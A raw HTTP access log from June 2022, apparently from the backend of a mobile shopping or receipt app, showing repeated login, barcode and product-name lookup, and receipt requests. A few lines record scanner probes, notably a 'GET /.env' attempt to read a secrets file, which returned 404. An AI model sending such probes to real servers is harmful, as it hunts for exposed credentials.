::1 - - [06/Jun/2022:19:22:49 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:22:54 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:23:12 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 318 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:23:17 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:23:24 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 910 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:24:35 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:24:40 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:25:44 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:25:50 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:26:28 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:26:32 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:31:13 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:31:18 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:31:46 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 396 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:31:52 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:31:59 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 910 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:32:25 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 396 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:32:29 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:32:36 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 912 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:33:40 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:33:47 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 904 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:33:56 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 318 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:34:01 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:34:05 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 905 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:34:09 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 320 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:34:14 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:34:18 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 905 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:34:59 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [06/Jun/2022:19:36:01 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 318 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:36:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:36:13 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 905 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:36:28 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 320 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:36:32 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:36:37 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 906 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:37:05 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 320 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:37:10 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:37:18 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 906 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:38:20 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:38:29 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:39:54 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:40:01 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:40:49 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:40:59 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:41:12 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:41:17 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:41:26 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:41:31 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:41:51 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:41:56 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:42:34 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:42:37 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:43:32 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 320 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:43:40 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:43:44 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 907 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:53:39 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:55:22 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:56:55 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:57:06 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:57:34 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:19:57:39 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:19:58:32 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:00:51 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:03:51 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:03:58 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:04:09 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 396 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:04:20 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 200 907 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:06:13 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:20:06:14 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [06/Jun/2022:20:07:59 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:08:04 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:08:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:08:15 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:10:46 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:10:54 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:16:06 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:16:10 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:17:26 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:17:31 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:20:57 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [06/Jun/2022:20:24:34 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:25:08 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:25:40 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:25:45 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:26:16 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:26:21 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:28:49 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:28:54 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:33:00 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:33:11 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:33:16 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:34:07 +0000] "GET /api/v1/goods/user?barCode=8656170005691 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:20:59:03 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:20:59:04 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:00:13 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:06 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:08 +0000] "GET /api/v1/goods/user?name=M HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:10 +0000] "GET /api/v1/goods/user?name=Mo HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:11 +0000] "GET /api/v1/goods/user?name=M HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:12 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:16 +0000] "GET /api/v1/goods/user?name=m HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:16 +0000] "GET /api/v1/goods/user?name=mm HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:16 +0000] "GET /api/v1/goods/user?name=mmo HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:17 +0000] "GET /api/v1/goods/user?name=mm HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:17 +0000] "GET /api/v1/goods/user?name=m HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:18 +0000] "GET /api/v1/goods/user?name=mo HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:18 +0000] "GET /api/v1/goods/user?name=mou HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:18 +0000] "GET /api/v1/goods/user?name=mous HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:19 +0000] "GET /api/v1/goods/user?name=mouse HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:20 +0000] "GET /api/v1/goods/user?name=mous HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:20 +0000] "GET /api/v1/goods/user?name=mou HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:20 +0000] "GET /api/v1/goods/user?name=mo HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:20 +0000] "GET /api/v1/goods/user?name=m HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:01:21 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:01:28 +0000] "GET /api/v1/goods/user?barCode=8886419332695 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:00 +0000] "POST /api/v1/users/login HTTP/1.0" 200 547 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:00 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:03 +0000] "GET /api/v1/goods/user?name=m HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:04 +0000] "GET /api/v1/goods/user?name=mo HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:05 +0000] "GET /api/v1/goods/user?name=mou HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:07 +0000] "GET /api/v1/goods/user?name=mo HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:07 +0000] "GET /api/v1/goods/user?name=m HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:07 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:09 +0000] "GET /api/v1/goods/user?name=%D0%A5 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:11 +0000] "GET /api/v1/goods/user?name=%D0%A5%D0%B2 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:12 +0000] "GET /api/v1/goods/user?name=%D0%A5 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:12 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:16 +0000] "GET /api/v1/goods/user?name=%D1%85 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:18 +0000] "GET /api/v1/goods/user?name= HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:19 +0000] "GET /api/v1/goods/user?name=%D0%A5 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:23 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:25 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:28 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:28 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3%D0%B0 HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:02:28 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3%D0%B0%D0%BD HTTP/1.0" 200 103 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:02:29 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3%D0%B0%D0%BD%D0%B0 HTTP/1.0" 200 510 "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:03:05 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3%D0%B0%D0%BD HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:03:05 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::1 - - [06/Jun/2022:21:03:05 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
::ffff:127.0.0.1 - - [06/Jun/2022:21:04:28 +0000] "GET /api/v1/goods/user?name=%D0%A5%D1%83%D0%BB%D0%B3 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1331.0.7 Darwin/21.4.0"
